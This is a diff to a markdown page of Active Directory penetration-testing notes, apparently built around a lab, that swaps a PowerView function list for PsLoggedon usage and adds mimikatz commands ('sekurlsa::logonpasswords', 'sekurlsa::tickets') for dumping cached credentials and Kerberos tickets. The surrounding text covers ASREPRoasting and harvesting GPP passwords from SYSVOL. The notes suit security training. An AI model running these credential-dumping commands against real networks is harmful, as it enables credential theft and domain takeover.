@@ -22,6 +22,7 @@ tags:
 	- [Privileges escalation in Active Directory from Linux](active-directory-from-linux-privilege-escalation.md)
 
 !!! tip "Attacking from Windows"
+	- [Enumerate with ldap](ldap.md)
 	- [Enumerating Active Directory from Windows](active-directory-from-windows-enumeration.md)
 	- [Active directory: connecting to other hosts](active-directory-connections.md)
 	- [Attacking Active Directory from Windows](active-directory-from-windows-attacks.md)
@@ -281,132 +282,21 @@ Get-ADTrust -Filter *
 ```
 
 ### PowerView
+
 [See more at Powerview](powerview.md).
 
-**Module: ActiveDirectory**
+From really basic enumeration to KERBEROASTING attacks. 
 
-```powershell
-########################
-# Domain/LDAP Functions
-########################
+### PSTools
 
-# Returns the AD object for the current (or specified) domain
-Get-Domain	
+See [PSTools](pstools.md) 
 
-# Return a list of the Domain Controllers for the specified domain
-Get-DomainController	
-
-# Returns all users or specific user objects in AD
-Get-DomainUser	
-# Example: 
-# Get-DomainUser -Identity $username -Domain $domain | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
-
-# Checks for users with the SPN attribute set
-Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
-
-# Returns all computers or specific computer objects in AD
-Get-DomainComputer	
-
-# Returns all groups or specific group objects in AD
-Get-DomainGroup	
-
-# Searches for all or specific OU objects in AD
-Get-DomainOU
-
-# Finds object ACLs in the domain with modification rights set to non-built in objects
-Find-InterestingDomainAcl	
-
-# Returns the members of a specific domain group
-Get-DomainGroupMember	
-# Example: 
-# Get-DomainGroupMember -Identity "Domain Admins" -Recurse
-# Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) 
-
-# Returns a list of servers likely functioning as file servers
-Get-DomainFileServer	
-
-# Returns a list of all distributed file systems for the current (or specified) domain
-Get-DomainDFSShare	
-
-
-########################
-# GPO Functions
-########################
-# Returns all GPOs or specific GPO objects in AD
-Get-DomainGPO	
-
-# Returns the default domain policy or the domain controller policy for the current domain
-Get-DomainPolicy	
-
-
-########################
-# Computer Enumeration Functions
-########################
-# Enumerates local groups on the local or a remote machine
-Get-NetLocalGroup
-
-# Enumerates members of a specific local group
-Get-NetLocalGroupMember	
-
-# Returns open shares on the local (or a remote) machine
-Get-NetShare	
-
-# Returns session information for the local (or a remote) machine
-Get-NetSession	
-
-# Tests if the current user has administrative access to the local (or a remote) machine
-Test-AdminAccess	
-# Example: 
-# Test-AdminAccess -ComputerName ACADEMY-EA-MS01
-
-
-########################
-# Threaded 'Meta'-Functions:
-########################
-# Finds machines where specific users are logged in
-Find-DomainUserLocation	
-
-# Finds reachable shares on domain machines
-Find-DomainShare	
-
-# Searches for files matching specific criteria on readable shares in the domain
-Find-InterestingDomainShareFile	
-
-# Finds machines on the local domain where the current user has local administrator access
-Find-LocalAdminAccess	
-
-
-########################
-# Domain Trust Functions:
-########################
-# Returns domain trusts for the current domain or a specified domain
-Get-DomainTrust	
-
-# Returns all forest trusts for the current forest or a specified forest
-Get-ForestTrust	
-
-# Enumerates users who are in groups outside of the user's domain
-Get-DomainForeignUser	
-
-# Enumerates groups with users outside of the group's domain and returns each foreign member
-Get-DomainForeignGroupMember	
-
-# Enumerates all trusts for the current domain and any others seen.
-Get-DomainTrustMapping	
+```
+# List users logged in in a machine:
+.\PsLoggedorn.exe \\files04
 ```
 
-
-```powershell
-# Gets the ID for the current Domain (useful later for crafting Golden tickets)
-Get-DomainID
-
-# Displays policies for the Domain and accounts, including for instance LockoutBadAccounts
-Get-DomainPolicy
-
-# Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
-Get-DomainSPNTicket
-```
-
+If we see a domain admin user logged in in a machine in which we are Local admin, we might retrieve their credential.
 
 ### SharpView
 
@@ -632,6 +522,28 @@ Import-Module .\PowerView.ps1
 Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
 ```
 
+
+### Cached credentials with mimikatz
+
+```
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+
+### Cached credentials in SMB
+
+```
+# Let's open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path \\web04.corp.com\backup. This will create and cache a service ticket.
+dir \\web04.corp.com\backup
+
+# Once we've executed the directory listing on the SMB share, we can use Mimikatz to show the tickets that are stored in memory by entering sekurlsa::tickets.
+.\mimikatz.exe
+privilege::debug
+sekurlsa::tickets
+```
+
 ### Credentials in SMB Shares and SYSVOL Scripts
 
 The SYSVOL share can be a treasure trove of data, especially in large organizations. It is recommendable always have to look at it.
@@ -683,6 +595,8 @@ GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguarda
 
 It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. 
 
+[See Kerberos attacks](kerberos-attacks.md).
+
 ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
 
 #### DONT_REQ_PREAUTH Value using Get-DomainUser
@@ -720,7 +634,6 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ```
 
 However, this will be as accurate as the user list.
-
 
 ####  Get-NPUsers.py from the Impacket toolkit
 
